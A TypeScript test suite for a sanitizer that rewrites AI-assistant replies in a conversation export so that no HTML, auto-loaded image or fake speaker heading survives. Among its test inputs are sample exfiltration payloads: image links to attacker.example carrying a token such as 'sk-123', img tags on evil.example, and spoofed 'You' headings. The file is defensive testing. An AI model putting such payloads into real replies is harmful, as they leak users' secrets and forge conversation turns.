// A reply written into the export, read by the conversation's own reader (react-markdown with
// GitHub's extensions, micromark underneath): as it was written where it can be, kept to itself
// where it must be. Made-up replies.
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { describe, expect, it } from 'vitest';

import { asText, inlineText, reply } from '../src/server/markdown';

type Node = { type: string; depth?: number; url?: string; value?: string; children?: Node[] };

/** The tree the conversation's reader makes of some Markdown. */
function tree(markdown: string): Node {
  let read: Node | undefined;
  renderToStaticMarkup(createElement(Markdown, { remarkPlugins: [remarkGfm, () => (root: Node) => { read = root; }] }, markdown));
  return read!;
}
const walk = (node: Node, visit: (node: Node) => void) => {
  visit(node);
  for (const child of node.children ?? []) walk(child, visit);
};
const textOf = (node: Node): string => node.value ?? (node.children ?? []).map(textOf).join('');

/** A reply between the speakers, as the export writes one: what in it would pass for one, show HTML, load a picture or take what follows. */
function trouble(written: string): string[] {
  const root = tree(`# T\n\n## You\n\nq\n\n## Claude\n\n${written}\n\n## You\n\nnext\n\n## Claude\n\nok\n`);
  const found: string[] = [];
  const headings: string[] = [];
  walk(root, (node) => {
    if (node.type === 'heading' && node.depth! <= 2) headings.push(`h${node.depth} ${textOf(node)}`);
    if (node.type === 'html') found.push(`html ${node.value}`);
    if (node.type === 'image' && !/^data:image\//i.test(node.url ?? '')) found.push(`picture ${node.url}`);
    if (node.type === 'imageReference') found.push('picture by reference');
  });
  if (headings.join('|') !== 'h1 T|h2 You|h2 Claude|h2 You|h2 Claude') found.push(`headings ${headings.join('|')}`);
  const last = root.children!.slice(-3).map((node) => `${node.type} ${textOf(node)}`).join('|');
  if (last !== 'paragraph next|heading Claude|paragraph ok') found.push(`after it ${last}`);
  return found;
}

describe('a reply in the export', () => {
  it('is written as it was where nothing in it needs keeping to itself', () => {
    for (const said of [
      'Fixed: the axis starts at zero.\n\nRun `npm test` to check, or see [the docs](https://example.com/docs).',
      '### Steps\n\n1. Open `src/app.tsx`.\n2. Add:\n\n   ```tsx\n   // <Total /> keeps the sum\n   return <Total value={total} />;\n   ```\n\n3. Run **the tests**.',
      '| Name | Size |\n| --- | ---: |\n| `a.ts` | 1 kB |\n| b.ts | 2 kB |',
      '> A quote, with *emphasis*\n> and a second line.\n\n- [ ] a task\n- [x] done\n\n---\n\nThat is all ~~for now~~.',
      '```sh\n# install\nnpm ci\n```',
      'Use the `<details>` element, `![alt](src)` for a picture, and <https://example.com> for a link.',
    ]) {
      // A heading two levels down is the one change: `###` reads as `#####`.
      expect(reply(said), said).toBe(said.replace(/^### /m, '##### '));
    }
  });

  it('has its headings two levels down, a heading of `===` or `---` too, under the speakers', () => {
    expect(reply('# Plan\n\n## Steps\n\n###### Last')).toBe('### Plan\n\n#### Steps\n\n###### Last');
    expect(reply('First\nline\n===\n\nSecond\n---')).toBe('### First line\n\n#### Second');
    expect(reply('> ## Quoted\n- ## Listed\n1. - ## Nested')).toBe('> #### Quoted\n- #### Listed\n1. - #### Nested');
  });

  it('writes its HTML as text, as the conversation shows it, with a blank line after a block so it takes nothing', () => {
    expect(reply('Press <kbd>Ctrl</kbd>+C.')).toBe('Press &lt;kbd>Ctrl&lt;/kbd>+C.');
    // A block of HTML is its lines as text, line by line, as the reader takes it: to a blank line, or to where it ends.
    expect(reply('<details>\n<summary>More</summary>\nHidden **words**\n</details>')).toBe(
      '&lt;details\\>\\\n&lt;summary\\>More&lt;/summary\\>\\\nHidden \\*\\*words\\*\\*\\\n&lt;/details\\>',
    );
    expect(reply('<!-- note -->\nAfter')).toBe('&lt;!-- note --\\>\n\nAfter');
  });

  it('writes indented code as a fenced block, which every reader takes alike, in the containers it was in', () => {
    expect(reply('Before:\n\n    npm ci\n    npm test\n\nAfter')).toBe('Before:\n\n```\nnpm ci\nnpm test\n```\n\nAfter');
    expect(reply('-     <b>code</b>\n\n      more')).toBe('- ```\n  <b>code</b>\n\n  more\n  ```');
    expect(reply('>     ```\n>     x')).toBe('> ````\n> ```\n> x\n> ````');
  });

  it('closes a code block it leaves open at its end, only where what follows would not end it', () => {
    expect(reply('```js\nconst a = 1;')).toBe('```js\nconst a = 1;\n```');
    expect(reply('````\n```\nstill code')).toBe('````\n```\nstill code\n````');
    expect(reply('> ```\n> in a quote')).toBe('> ```\n> in a quote');
  });

  it('writes a picture as a link to it that names its site, and keeps one written into it', () => {
    expect(reply('![chart](https://example.com/c.png "Weekly") ![](//example.org/d.png) ![](e.png)')).toBe(
      '[chart · example.com](https://example.com/c.png "Weekly") [Image · example.org](//example.org/d.png) [Image](e.png)',
    );
    expect(reply('![dot](data:image/png;base64,iVBORw0KGgo=)')).toBe('![dot](data:image/png;base64,iVBORw0KGgo=)');
    // By reference, in each form, the same: the link has the address the definition gives.
    expect(reply('![a][r] ![r][] ![r]\n\n[r]: https://example.com/r.png "R"')).toBe(
      '[a · example.com](https://example.com/r.png "R") [r · example.com](https://example.com/r.png "R") [r · example.com](https://example.com/r.png "R")',
    );
    // One it cannot read whole is its words, a link to it if it is one: never a picture.
    expect(reply('![a `b`](https://example.com/c.png) ![a][none]')).toBe('\\![a `b`](https://example.com/c.png) \\![a][none]');
  });

  it('lets no `!` before a picture make a picture of the link it is written as', () => {
    // `!!` before one, as in "Done!!", by reference too, and an escape that leaves a `!` before it.
    expect(reply('Done!![screenshot](https://attacker.example/s.png?d=sk-123)')).toBe('Done\\![screenshot · attacker.example](https://attacker.example/s.png?d=sk-123)');
    expect(reply('Wow!!![a][r] !![r][] !![r] \\\\![b](https://attacker.example/b.png)\n\n[r]: https://attacker.example/r.png')).toBe(
      'Wow!\\![a · attacker.example](https://attacker.example/r.png) \\![r · attacker.example](https://attacker.example/r.png) \\![r · attacker.example](https://attacker.example/r.png) \\\\[b · attacker.example](https://attacker.example/b.png)',
    );
    // In a link's words, a picture is its name there, as the conversation shows it: no link in a link.
    expect(reply('[Done!![a](https://attacker.example/x.png)](https://example.com) [![CI](https://ci.example/b.svg)](https://ci.example)')).toBe(
      '[Done!a · attacker.example](https://example.com) [CI · ci.example](https://ci.example)',
    );
    for (const said of ['Done!![s](https://attacker.example/s.png) !![r] [x!![r]](u) !\\![r]\n\n[r]: https://attacker.example/r.png', '!![^1] [^1]\n\n[^1]: n']) {
      expect(trouble(reply(said)), said).toEqual([]);
    }
  });

  it('writes a link by reference with the address its definition gives, as the conversation reads it, and leaves the definition out', () => {
    // Full, collapsed and shortcut, a label matched as readers match one, its title on a line of its own.
    expect(reply('See [the docs][1], [the API][] and [Setup].\n\n[1]: https://example.com/docs "The docs"\n[THE  API]: <https://example.com/api v2>\n[setup]: /setup\n  (Setup guide)')).toBe(
      'See [the docs](https://example.com/docs "The docs"), [the API](https://example.com/api%20v2) and [Setup](/setup (Setup guide)).',
    );
    // A label it does not define is its words, as in the conversation; the first definition of a label counts.
    expect(reply('A [reply][1] by [itself][nope].\n\n[1]: https://a.example\n[1]: https://b.example')).toBe('A [reply](https://a.example) by [itself][nope].');
    // In code it is code, and a definition defines nothing there.
    expect(reply('`[a][1]`\n\n```\n[1]: /u\n```\n\n[1]: https://example.com')).toBe('`[a][1]`\n\n```\n[1]: /u\n```');
    // Its address and title, as text where a reader takes no link: no code, HTML, picture or table's `|` in them.
    expect(reply('| [a][1] |\n| - |\n\n[1]: https://e.example/a|`b` "x `y` <b> |"')).toBe(
      '| [a](https://e.example/a\\|%60b%60 "x &#96;y&#96; &lt;b> \\|") |\n| - |',
    );
    // The lines after definitions start a paragraph, in the containers they did: nothing at their start, which their
    // indentation kept from starting a block, starts one now.
    expect(reply('> [a]: /u\n> lazy words')).toBe('> lazy words');
    expect(reply('[x]: /u\n    ## You\n[y]: /v')).toBe('&#32;## You\n[y]: /v');
    expect(reply('[x]: /u\n===\n\n[x]: /u\n---\n\n[y]: /v\n\nend')).toBe('&#32;===\n\n---\n\nend');
    // An item that held definitions alone is empty, as in the conversation, and after a paragraph, a blank line first.
    expect(reply('- [a]: /u\n- b\n\npara\n- [a]: /u')).toBe('-\n- b\n\npara\n\n-');
    for (const said of ['[x]: /u\n    ## You', 'You\n- [a]: /u\n  ---', '> [r]: /u\n    ## You', '[r]: https://attacker.example/r.png\n![r]', '- [a]: /u\n    - ## You']) {
      expect(trouble(reply(said)), said).toEqual([]);
    }
  });

  it('keeps footnotes footnotes, as the conversation shows them, under labels of the reply’s own', () => {
    // Labels start with the reply's number in the export; a footnote of one line is written on one.
    expect(reply('Note[^1] and[^note].\n\n[^1]: One line.\n[^note]: Two\n    lines.', 4)).toBe(
      'Note[^4-1] and[^4-2].\n\n[^4-1]: One line.\n\n[^4-2]:\n\n    Two\n    lines.',
    );
    // A `[^` that calls none of the reply's footnotes calls none in the export either; `![^1]` is a `!` and a call,
    // blanks before its `^` aside, as a label's are.
    expect(reply('Not one: [^x], [^2-1] and ![^1]\n\n[^1]: n', 2)).toBe('Not one: [\\^x], [\\^2-1] and \\![^2-1]\n\n[^2-1]: n');
    expect(reply('x[^1] and ![ ^1]\n\n[^1]: n')).toBe('x[^1-1] and \\![^1-1]\n\n[^1-1]: n');
    expect(reply('x[^ab] and ![ ^AB]\n\n[^ab]: n')).toBe('x[^1-1] and \\![^1-1]\n\n[^1-1]: n');
    // More than a line, it starts on the line after its marker, inside it: readers without footnotes take all of it for
    // code, so none of it is a heading, HTML or a picture there, whatever it is in the footnote.
    expect(reply('x[^a]\n\n[^a]: ```js\n    <b>x</b>\n    ```')).toBe('x[^1-1]\n\n[^1-1]:\n\n    ```js\n    <b>x</b>\n    ```');
    expect(reply('x[^a]\n\n[^a]: First, `a\nlazy` <b>\n\n    ## Second')).toBe('x[^1-1]\n\n[^1-1]:\n\n    First, `a\n    lazy` &lt;b>\n\n    #### Second');
    for (const said of ['x[^a]\n\n[^a]: ```\n    <img src="https://attacker.example/i.png">\n    ## You', 'x[^a]\n\n[^a]: You\n   -', '[^a]: x\n2) ## You', '> [^a]: x\n\t## You', 'x[^a]\n[^a]: [r]: /u\n===']) {
      expect(trouble(reply(said)), said).toEqual([]);
    }
  });

  it('keeps a link’s address in `<…>` as written, or as an address with no `<` where a reader could take it for HTML', () => {
    expect(reply('Open [the file](<docs/My Notes.md>) or [the site](<https://e.example/a b>).')).toBe('Open [the file](<docs/My Notes.md>) or [the site](<https://e.example/a b>).');
    expect(reply('[the notes](<My Notes.md> "Notes") ![a](<Pic One.png>)')).toBe('[the notes](My%20Notes.md "Notes") [a](Pic%20One.png)');
    // Not a link's: HTML, as text.
    expect(reply('[a] (<My Notes.md>)')).toBe('[a] (&lt;My Notes.md>)');
  });

  it('keeps HTML in code that a reader takes as code, and writes it as text where readers part ways', () => {
    expect(reply('It is `<b>` you want.')).toBe('It is `<b>` you want.');
    // A link's address, or a bare link, may take a backquote: the code after it is not sure, so its HTML is text.
    expect(reply('[a](u`v) `<h2>You</h2>`')).toBe('[a](u`v) `&lt;h2>You&lt;/h2>`');
    // A picture's address takes its backquote too: the run after it ends no code, and is written escaped.
    expect(reply('![w](u`v) [`` <i> `` x `')).toBe('[w](u`v) [`` <i> `` x \\`');
    expect(reply('https://example.com/`x <h2>You</h2> `')).toBe('https://example.com/`x &lt;h2>You&lt;/h2> `');
    // A run of backquotes that ends no code is written escaped, as it shows: the code after it is code, with its tags.
    expect(reply('`` a ` <b>x</b> ` and [b] `<i>` ```')).toBe('\\`\\` a ` <b>x</b> ` and [b] `<i>` \\`\\`\\`');
  });

  it('writes what readers part ways on so that they read it alike: the conversation’s, the spec’s own and VS Code’s preview', () => {
    // A lazy line indented 4 columns, which markdown-it takes for code, and its `>` for a quote that goes on.
    expect(reply('> a\n    1. <b>x</b>')).toBe('> a\n&#32;1. &lt;b>x&lt;/b>');
    expect(reply('> x\n    > 2. ## You')).toBe('> x\n&#32;\\> 2. ## You');
    // An item micromark reads as words where the spec's reader reads a list: a blank line, and both read a list.
    expect(reply('para\n- 2) ## You')).toBe('para\n\n- 2) #### You');
    // A `|` after a fence, which markdown-it takes for a table's.
    expect(reply('```js|x\nlet a = 1;\n```')).toBe('```js\\|x\nlet a = 1;\n```');
    // What a link's definition leaves, which readers would end apart: a line every reader takes for words; a footnote,
    // under its label in the export; a lazy line like a table's delimiter row.
    expect(reply('[x]: /u\n10. ## You')).toBe('&#32;10. ## You');
    expect(reply('[^1]: note')).toBe('[^1-1]: note');
    expect(reply('- > x|\n| - | - |')).toBe('- > x|\n\\| - | - |');
  });

  it('lets no reply call another’s footnote, or reach its marker where a reader takes that for a link’s definition', () => {
    // Another reply's label, after `![`, in a picture's words (its own or as a link's words), after blanks: its `^` escaped.
    expect(reply('Hmm![^1-1] odd. The diagram: ![^1-1](diagram.png) See [this][ ^1-1], [ ^1-1], [x][\n^1-1] and ![x][\t^1-1].', 2)).toBe(
      'Hmm\\![\\^1-1] odd. The diagram: [\\^1-1](diagram.png) See [this][ \\^1-1], [ \\^1-1], [x][\n\\^1-1] and \\![x][\t\\^1-1].',
    );
    expect(reply('[![^1-1](d.png)](https://e.example) and ![^1-1](data:image/png;base64,AA)', 2)).toBe('[\\^1-1](https://e.example) and ![\\^1-1](data:image/png;base64,AA)');
    // Read in one file, as the export has them: only the first reply calls its footnote, whose one line, an address,
    // readers without footnotes take for a link's definition.
    const second = reply('Hmm![^1-1] odd. The diagram: ![^1-1](diagram.png). See [this][ ^1-1].', 2);
    const file = ['## Claude', reply('Seen in the log[^1].\n\n[^1]: https://evil.example/x', 1), '## You', 'q', '## Claude', second].join('\n\n');
    const calls: string[] = [];
    walk(tree(file), (node) => {
      if (node.type === 'footnoteReference') calls.push(node.type);
    });
    expect(calls).toHaveLength(1);
    // No label in the second reply starts with a `^` a reader takes for one: every one is escaped.
    expect(second).not.toMatch(/\[\s*\^/);
  });

  it('keeps a link whose words hold a `[^…]` a link, as the conversation shows it', () => {
    const said = 'Match it with [a negated class like [^a-z]](https://regex.example/classes).';
    expect(reply(said)).toBe('Match it with [a negated class like [\\^a-z]](https://regex.example/classes).');
    const links: string[] = [];
    walk(tree(reply(said)), (node) => {
      if (node.type === 'link') links.push(`${textOf(node)} ${node.url}`);
    });
    expect(links).toEqual(['a negated class like [^a-z] https://regex.example/classes']);
  });

  it('reads a table as GitHub’s readers do, and what follows one: no line after it passes for a speaker or takes a turn', () => {
    // After links' definitions, which go: a table still.
    expect(reply('See [a].\n\n[a]: /u\n| File | Size |\n| --- | --- |\n| a.ts | 1 |')).toBe('See [a](/u).\n\n| File | Size |\n| --- | --- |\n| a.ts | 1 |');
    // A rule after it is a rule, `===` a row; neither makes a heading of it in the spec's reader, which has no tables.
    expect(reply('| a | b |\n|---|---|\n| 1 | 2 |\n---\nNext')).toBe('| a | b |\n|---|---|\n| 1 | 2 |\n\n---\nNext');
    expect(reply('| a | b |\n|---|---|\n| 1 | 2 |\n===\nNext')).toBe('| a | b |\n|---|---|\n| 1 | 2 |\n\\===\nNext');
    expect(reply('| File | Change |\n| --- | --- |\n| a.ts | fix |\nSummary\n---')).toBe('| File | Change |\n| --- | --- |\n| a.ts | fix |\nSummary\n\n---');
    // What GitHub's readers start after a table, as after no paragraph: a list at any number, an empty item, HTML,
    // indented code; its headings two levels down, a blank line before it where the spec's reader would read it apart.
    expect(reply('| a | b |\n|---|---|\n| 1 | 2 |\n2. ## You')).toBe('| a | b |\n|---|---|\n| 1 | 2 |\n\n2. #### You');
    expect(reply('| a |\n| - |\n1.\n   You\n   ---')).toBe('| a |\n| - |\n\n1.\n   #### You');
    expect(reply('| a |\n| - |\n<custom-tag>\n2. ## You')).toBe('| a |\n| - |\n\n&lt;custom-tag\\>\\\n2\\. ## You');
    expect(reply('| a |\n| - |\n    ## You')).toBe('| a |\n| - |\n```\n## You\n```');
    expect(reply('> a\n> | b |\n> | - |\n> 2. ## You')).toBe('> a\n> | b |\n> | - |\n>\n> 2. #### You');
    // An item of the list a table is in needs none, and the list stays tight.
    expect(reply('1. Files:\n   | a | b |\n   |---|---|\n   | 1 | 2 |\n2. Next')).toBe('1. Files:\n   | a | b |\n   |---|---|\n   | 1 | 2 |\n2. Next');
    // A head on an item's first line starts with a `|`: markdown-it would take the line, marker and all, for a table's
    // head, and the fence after it for one of its own that takes the turns after the reply.
    expect(reply('1. a | b\n   |---|---|\n   ```\n   code')).toBe('1. | a | b\n   |---|---|\n   ```\n   code');
    // A head the reader takes lazily, after links' definitions alone, is written in the item it is read in.
    expect(reply('- [a]: /u\nx | y\n  -|-\n  1 | 2')).toBe('-\n  x | y\n  -|-\n  1 | 2');
    // A line like a link's definition heading a table is no definition, in any reader.
    expect(reply('[a]: /u\n| - |\n\n[a]')).toBe('\\[a]: /u\n| - |\n\n[a]');
    // A delimiter row under a line that heads no table makes none where it is written.
    expect(reply('| `a|b` | c |\n| - | - |')).toBe('| `a|b` | c |\n\\| - | - |');
    for (const said of ['| a | b |\n|---|---|\n| 1 | 2 |\n2. ## You', '| a |\n| - |\n-\nYou\n---', '| a |\n| - |\n1.\n   You\n   ---', '| a |\n| - |\n1)\n   ## You', '| a |\n| - |\n===',
      '| a |\n| - |\n<div>\n## You', '| a |\n| - |\n<!-- x\n\n## You', '- a | b\n  |---|---|\n  ```', '> | a |\n> | - |\n| b |\nYou\n===', '- para\n===\n  :-\n  1 | 2', '> You\n===\n> |:-\n> -',
      '- [a]: /u\n  [b]: /v "t"\nx\n  -:\n  `a\n  [^1]: ## You\n  | `<b>x</b>` | y |\nYou\n===']) {
      expect(trouble(reply(said)), said).toEqual([]);
    }
    const kinds: string[] = [];
    walk(tree(reply('See [a].\n\n[a]: /u\n| File | Size |\n| --- | --- |\n| a.ts | 1 |\n2. Next')), (node) => kinds.push(node.type));
    expect(kinds).toContain('table');
    expect(kinds).toContain('list');
  });

  it('keeps an item whose first line held links’ definitions alone the item it was, past a blank line', () => {
    expect(reply('- [docs]: https://e.example/docs\n\n  See [docs] for more.\n\n- Next item')).toBe('-\n  See [docs](https://e.example/docs) for more.\n\n- Next item');
    expect(reply('1. [a]: /u\n   [^1]: note\n   - sub [a]\n2. two')).toBe('1.\n   [^1-1]:\n\n       note\n   - sub [a](/u)\n2. two');
    expect(reply('> - [a]: /u\n>\n>   x')).toBe('> -\n>   x');
    const lists: number[] = [];
    walk(tree(reply('- [docs]: https://e.example/docs\n\n  See [docs] for more.\n\n- Next item')), (node) => {
      if (node.type === 'list') lists.push(node.children!.length);
    });
    expect(lists).toEqual([2]);
  });

  it('keeps code code, its tags as written, however many links come before it', () => {
    const rows = ['| File | Type |', '| --- | --- |', ...Array.from({ length: 30 }, (_, i) => `| [f${i}.ts](src/f${i}.ts) | \`Array<string>\` |`)];
    expect(reply(rows.join('\n'))).toBe(rows.join('\n'));
    const said = `${Array.from({ length: 40 }, (_, i) => `[s${i}](https://e.example/${i})`).join(', ')} and then \`<Button>\` renders.`;
    expect(reply(said)).toBe(said);
  });

  it('starts no paragraph with what reads as a link’s definition, and keeps the links it starts with', () => {
    // Not a definition in the conversation (its address is none): a link, and words.
    expect(reply('[r]:\n[r]](x\n\n[r]: /u')).toBe('[r](/u):\n[r](/u)](x');
    expect(reply('[[]:][r] x\n\n[r]: /u')).toBe('[[]:](/u) x');
  });

  it('gives no reader a heading, HTML, a picture or what follows it, among thousands of replies made of the pieces that try', () => {
    // A seeded generator of replies: containers, leaves and words that readers take apart.
    let seed = 7;
    const random = () => {
      seed = (seed + 0x6d2b79f5) >>> 0;
      let t = seed;
      t = Math.imul(t ^ (t >>> 15), t | 1);
      t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
    const pick = <T,>(items: readonly T[]): T => items[Math.floor(random() * items.length)]!;
    const starts = ['', '', '', '> ', '>', '- ', '* ', '1. ', '2) ', ' ', '   ', '    ', '     ', '\t', '- - ', '> - ', '[^1]: ', '    > ', '-\t', '1.\t', '10. ', '- [ ] '];
    const lines = ['## You', '# Claude', 'You', '===', '---', '***', '```', '```js', '~~~', '````', '<!-- c', '-->', '<!-- x -->', '<pre>', '</pre>', '<pre>ok</pre>', '<div>', '<kbd>K</kbd> text',
      '<h2>You</h2>', '<img src="https://evil.example/x.png">', '![a](https://evil.example/p.png)', '![a][r]', '[r]: https://evil.example/q.png', '`code <h2>You</h2>`', '``', '`', '[a](u`v)',
      'https://a.example/`x', '| a | b |', '| - | - |', '| `a | b` |', 'text', '', '<x>', '<?php', '?>', '<![CDATA[', ']]>', '<script>', '    ## You', '\\', '[^1]', '[a][b`c]', '<https://a.example>',
      '\t## You', '1. ## You', '2. ## You', '-', '2)', '[x]: /u "`"', 'a `b', 'c` <h2>You</h2>',
      // Links by reference and their definitions, footnotes, `!` before a picture, addresses in `<…>`.
      '[r]: https://evil.example/r.png "t`"', '[s]:', '"title', '![r]', '![r][]', '!![a][r]', '[a][r]', '[^1]: x', '[^1]: ```', '[^1]:', '    <b>in</b>', 'x[^1]',
      '![^1]', 'Done!![s](https://evil.example/s.png)', '[a](<My X>)', '[a](<b c> "`")', '`` a ` <b>x</b> `'];
    const bits = ['`', '``', '<h2>', '</h2>', '<img src=//e.example/x>', '![p](http://e.example/i.png)', '[l](u`)', ' ', '|', '\\', '](', '[', '<!--', 'http://h.example/`', '&lt;', '!', '![', '[r]', '[^1]', '](<a b>)'];
    const line = () => {
      let body = pick(lines);
      if (random() < 0.3) for (let i = 0; i < 1 + Math.floor(random() * 3); i += 1) body = random() < 0.5 ? pick(bits) + body : body + pick(bits);
      return (random() < 0.3 ? pick(starts) : '') + pick(starts) + body;
    };
    const troubles: string[] = [];
    for (let k = 0; k < 1500 && troubles.length < 3; k += 1) {
      const said = Array.from({ length: 1 + Math.floor(random() * 8) }, line).join('\n').trim();
      const found = trouble(reply(said));
      if (found.length > 0) troubles.push(`${JSON.stringify(said)}: ${found.join('; ')}`);
    }
    expect(troubles).toEqual([]);
  }, 30_000);

  it('reads each line once: a long reply of the characters that start Markdown takes moments, not minutes', () => {
    const megabyte = 1 << 20;
    for (const [name, said] of [
      ['quote markers', `${'> '.repeat(100_000)}ok`],
      ['list markers', `${'- '.repeat(100_000)}ok`],
      ['numbered items', `${'1. '.repeat(50_000)}ok`],
      ['backquotes', '` '.repeat(megabyte / 2)],
      ['brackets', '[a]('.repeat(megabyte / 4)],
      ['pictures', '!['.repeat(megabyte / 2)],
      ['tags', '<a b=c '.repeat(megabyte / 7)],
      ['bare links', '(http://'.repeat(megabyte / 8)],
      ['quoted lines', `> a\n${'    > b\n'.repeat(50_000)}`],
      ['footnotes', '[^a]: x\n'.repeat(megabyte / 8)],
      ['links by reference', `${'[a][r] '.repeat(megabyte / 7)}\n\n[r]: /u`],
      ['shortcut links', `${'[r] `'.repeat(megabyte / 5)}\n\n[r]: /u`],
      ['definitions', '[a]: http://x\n'.repeat(megabyte / 14)],
      ['definitions apart', '[a]: /u\n\n'.repeat(megabyte / 9)],
      ['nested brackets', `${'['.repeat(megabyte / 2)}${']'.repeat(megabyte / 2)}`],
      ['pictures, then links', `${'!['.repeat(megabyte / 8)}${'[a](u) '.repeat(megabyte / 14)}`],
      ['pictures, then links by reference', `${'!['.repeat(megabyte / 8)}${'[a][r] '.repeat(megabyte / 14)}\n\n[r]: /u`],
      ['pictures, then shortcut links', `${'!['.repeat(megabyte / 8)}${'[r] '.repeat(megabyte / 8)}\n\n[r]: /u`],
      ['links, then code', `${'[a](u) '.repeat(megabyte / 14)}\`<b>\``],
      ['table rows', `| a | b |\n| - | - |\n${'| `x|y` | [l](u) |\n'.repeat(megabyte / 20)}`],
      ['lazy lines in footnotes', `${'[^a]: '.repeat(45)}x\n${'y\n'.repeat(megabyte / 2)}`],
    ] as const) {
      const started = performance.now();
      reply(said);
      expect(performance.now() - started, name).toBeLessThan(1500);
    }
    // Written, it is at most a few times its size, however it is made to grow: a long address its links by reference use
    // again and again, and lazy lines in footnotes in containers, each written inside them.
    for (const [name, said] of [
      ['a long address used many times', `${'[x][r] '.repeat(20_000)}\n\n[r]: /${'a'.repeat(100_000)}`],
      ['footnotes in footnotes', `${'[^a]: '.repeat(45)}x\n${'y\n'.repeat(100_000)}`],
      ['quotes in a footnote', `[^a]: ${'> '.repeat(45)}x\n${'y\n'.repeat(100_000)}`],
      ['a footnote in items', `${'1. '.repeat(45)}[^a]: x\n${'y\n'.repeat(100_000)}`],
      ['footnotes in footnotes, line after line', `${'[^a]: '.repeat(45)}x\n`.repeat(2000)],
    ] as const) {
      expect(reply(said).length, name).toBeLessThan(4 * said.length + 100_000);
    }
    // A prompt is text: a megabyte of the characters an email or a link is made of, read once.
    for (const c of ['+', '.', 'a@', 'www.']) {
      const started = performance.now();
      asText(c.repeat(megabyte / c.length));
      inlineText(c.repeat(megabyte / c.length));
      expect(performance.now() - started, c).toBeLessThan(1500);
    }
  }, 60_000);
});
